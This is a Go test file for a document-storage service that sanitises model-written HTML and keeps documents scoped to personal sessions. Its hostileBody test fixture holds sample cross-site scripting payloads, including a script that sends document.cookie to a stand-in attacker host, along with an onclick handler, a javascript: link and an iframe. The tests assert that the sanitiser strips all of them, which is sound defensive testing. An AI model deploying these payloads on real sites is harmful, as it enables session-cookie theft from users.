package docs_test

import (
	"context"
	"encoding/json"
	"errors"
	"strings"
	"testing"

	"github.com/kameas-ai/kenaz-harness/core/docs"
	"github.com/kameas-ai/kenaz-harness/core/storage"
	storagesqlite "github.com/kameas-ai/kenaz-harness/core/storage/sqlite"
	"github.com/kameas-ai/kenaz-harness/core/units"
)

// newSQLService drives real sqlite (CLAUDE.md blind spot #2: persistence
// assertions must not ride the in-memory store).
func newSQLService(t *testing.T) (*docs.Service, *units.Manager) {
	t.Helper()
	db, err := storagesqlite.Open(storage.Config{
		DataDir:          t.TempDir(),
		EncryptionStatus: storage.EncryptionStatusDisabledWithDiskEncryption,
	})
	if err != nil {
		t.Fatalf("Open: %v", err)
	}
	t.Cleanup(func() { _ = db.Close(context.Background()) })
	mgr := units.NewManager(units.NewSQLStore(db))
	return docs.NewService(mgr), mgr
}

const hostileBody = `<h1>Runbook</h1>
<p onclick="steal()">Step one <a href="javascript:alert(1)">bad</a> <a href="https://example.com/x">good</a></p>
<script>fetch("https://evil.example/"+document.cookie)</script>
<img src="https://tracker.example/pixel.gif" alt="pixel">
<link rel="stylesheet" href="/host.css">
<iframe src="https://evil.example"></iframe>
<table><tr><th>k</th><th>v</th></tr><tr><td>a</td><td>1</td></tr></table>`

func modelProv(session string) docs.Provenance {
	return docs.Provenance{AuthorKind: docs.AuthorModelOutput, SessionID: session, Tool: "kenaz__save_document"}
}

func TestService_SaveSanitizesAndPersistsAsPersonalSessionDoc(t *testing.T) {
	t.Parallel()
	svc, mgr := newSQLService(t)
	ctx := context.Background()

	d, err := svc.Save(ctx, "sess-a", "  Deploy runbook  ", hostileBody, modelProv("sess-a"))
	if err != nil {
		t.Fatalf("Save: %v", err)
	}
	if d.Title != "Deploy runbook" {
		t.Errorf("title not trimmed: %q", d.Title)
	}
	for _, bad := range []string{"<script", "onclick", "javascript:", "tracker.example", "/host.css", "<iframe"} {
		if strings.Contains(d.Body, bad) {
			t.Errorf("stored body retains %q:\n%s", bad, d.Body)
		}
	}
	if !strings.Contains(d.Body, `href="https://example.com/x"`) {
		t.Errorf("https link lost:\n%s", d.Body)
	}

	u, err := mgr.Get(ctx, d.ID)
	if err != nil {
		t.Fatalf("Get unit: %v", err)
	}
	if u.Kind != units.KindDoc || u.Scope != units.ScopeSession || u.ScopeID != "sess-a" ||
		u.Classification != units.ClassPersonal || u.LoadPolicy != units.LoadOnDemand {
		t.Fatalf("unexpected unit shape: %+v", u)
	}
	var meta map[string]any
	if err := json.Unmarshal(u.Metadata, &meta); err != nil {
		t.Fatalf("metadata: %v", err)
	}
	if meta["format"] != docs.FormatHTML || meta["content_sha256"] != d.ContentSHA256 || d.ContentSHA256 == "" {
		t.Errorf("metadata = %v", meta)
	}
	prov, _ := meta["provenance"].(map[string]any)
	if prov["author_kind"] != docs.AuthorModelOutput || prov["tool"] != "kenaz__save_document" {
		t.Errorf("provenance = %v", prov)
	}
	if strings.Contains(string(u.Metadata), "Deploy runbook") {
		t.Error("metadata must not carry the title")
	}
}

// R-7: no document path may produce a non-personal doc, and Service
// refuses to read or write one that got into the store some other way.
func TestService_ClassificationFrozenAtPersonal(t *testing.T) {
	t.Parallel()
	svc, mgr := newSQLService(t)
	ctx := context.Background()

	team, err := mgr.Create(ctx, units.Unit{
		Kind: units.KindDoc, Scope: units.ScopeGlobal, Classification: units.ClassTeam,
		LoadPolicy: units.LoadOnDemand, Title: "team doc", Body: "<p>x</p>",
	})
	if err != nil {
		t.Fatalf("seed: %v", err)
	}
	if _, err := svc.Get(ctx, "sess-a", team.ID); !errors.Is(err, docs.ErrDocumentNotFound) {
		t.Errorf("Get team doc err = %v, want not found", err)
	}
	if _, err := svc.Update(ctx, "sess-a", team.ID, -1, "<p>y</p>", modelProv("sess-a")); !errors.Is(err, docs.ErrDocumentNotFound) {
		t.Errorf("Update team doc err = %v, want not found", err)
	}
	list, err := svc.ListVisible(ctx, "sess-a")
	if err != nil {
		t.Fatalf("ListVisible: %v", err)
	}
	if len(list) != 0 {
		t.Errorf("team doc leaked into list: %+v", list)
	}

	d, err := svc.Save(ctx, "sess-a", "mine", "<p>hi</p>", modelProv("sess-a"))
	if err != nil {
		t.Fatalf("Save: %v", err)
	}
	u, _ := mgr.Get(ctx, d.ID)
	if u.Classification != units.ClassPersonal {
		t.Errorf("classification = %q", u.Classification)
	}
}

func TestService_VisibilityIsPerSessionAndHidesExistence(t *testing.T) {
	t.Parallel()
	svc, mgr := newSQLService(t)
	ctx := context.Background()

	a, err := svc.Save(ctx, "sess-a", "A", "<p>a</p>", modelProv("sess-a"))
	if err != nil {
		t.Fatal(err)
	}
	global, err := mgr.Create(ctx, units.Unit{
		Kind: units.KindDoc, Scope: units.ScopeGlobal, Classification: units.ClassPersonal,
		LoadPolicy: units.LoadOnDemand, Title: "G", Body: "<p>g</p>",
	})
	if err != nil {
		t.Fatal(err)
	}
	snippet, err := mgr.Create(ctx, units.Unit{
		Kind: units.KindSnippet, Scope: units.ScopeGlobal, Classification: units.ClassPersonal,
		LoadPolicy: units.LoadOnDemand, Title: "S", Body: "s",
	})
	if err != nil {
		t.Fatal(err)
	}

	for _, id := range []string{a.ID, snippet.ID, "01ZZZZZZZZZZZZZZZZZZZZZZZZ", ""} {
		if _, err := svc.Get(ctx, "sess-b", id); !errors.Is(err, docs.ErrDocumentNotFound) {
			t.Errorf("sess-b Get(%q) err = %v, want not found", id, err)
		}
	}
	if _, err := svc.Update(ctx, "sess-b", a.ID, -1, "<p>overwrite</p>", modelProv("sess-b")); !errors.Is(err, docs.ErrDocumentNotFound) {
		t.Errorf("cross-session Update err = %v", err)
	}
	if _, err := svc.Get(ctx, "sess-b", global.ID); err != nil {
		t.Errorf("global doc should be visible: %v", err)
	}

	listA, _ := svc.ListVisible(ctx, "sess-a")
	listB, _ := svc.ListVisible(ctx, "sess-b")
	if len(listA) != 2 || len(listB) != 1 || listB[0].ID != global.ID {
		t.Errorf("listA=%d listB=%+v", len(listA), listB)
	}
	if _, err := svc.ListVisible(ctx, ""); !errors.Is(err, docs.ErrNoSession) {
		t.Errorf("empty session list err = %v", err)
	}
}

func TestService_UpdateVersionsAndDetectsStaleBase(t *testing.T) {
	t.Parallel()
	svc, mgr := newSQLService(t)
	ctx := context.Background()

	d, err := svc.Save(ctx, "s", "Doc", "<p>v0</p>", modelProv("s"))
	if err != nil {
		t.Fatal(err)
	}
	d1, err := svc.Update(ctx, "s", d.ID, d.Version, "<p>v1<script>x()</script></p>", modelProv("s"))
	if err != nil {
		t.Fatalf("Update: %v", err)
	}
	if d1.Version != d.Version+1 || strings.Contains(d1.Body, "script") || d1.ContentSHA256 == d.ContentSHA256 {
		t.Errorf("update result = %+v", d1)
	}
	if _, err := svc.Update(ctx, "s", d.ID, d.Version, "<p>stale</p>", modelProv("s")); !errors.Is(err, docs.ErrVersionConflict) {
		t.Errorf("stale base err = %v, want version conflict", err)
	}
	if code := docs.ServiceErrorCode(docs.ErrVersionConflict); code != docs.CodeVersionConflict {
		t.Errorf("code = %q", code)
	}
	versions, err := mgr.ListVersions(ctx, d.ID)
	if err != nil || len(versions) != 1 {
		t.Fatalf("versions = %d, %v", len(versions), err)
	}
}

func TestService_RejectsBadInput(t *testing.T) {
	t.Parallel()
	svc, _ := newSQLService(t)
	ctx := context.Background()
	cases := []struct {
		name, session, title, body string
		want                       error
	}{
		{"no session", "", "t", "<p>x</p>", docs.ErrNoSession},
		{"empty title", "s", "   ", "<p>x</p>", docs.ErrInvalidTitle},
		{"control char title", "s", "a\x07b", "<p>x</p>", docs.ErrInvalidTitle},
		{"long title", "s", strings.Repeat("é", docs.MaxTitleRunes+1), "<p>x</p>", docs.ErrInvalidTitle},
		{"empty body", "s", "t", "  ", docs.ErrEmptyBody},
		{"only active content", "s", "t", "<script>x()</script>", docs.ErrEmptyBody},
		{"too large", "s", "t", strings.Repeat("a", docs.MaxBodyBytes+1), docs.ErrBodyTooLarge},
	}
	for _, tc := range cases {
		if _, err := svc.Save(ctx, tc.session, tc.title, tc.body, modelProv(tc.session)); !errors.Is(err, tc.want) {
			t.Errorf("%s: err = %v, want %v", tc.name, err, tc.want)
		}
	}
	if code := docs.ServiceErrorCode(docs.ErrBodyTooLarge); code != docs.CodeContentTooLarge {
		t.Errorf("sanitizer code passthrough = %q", code)
	}
}
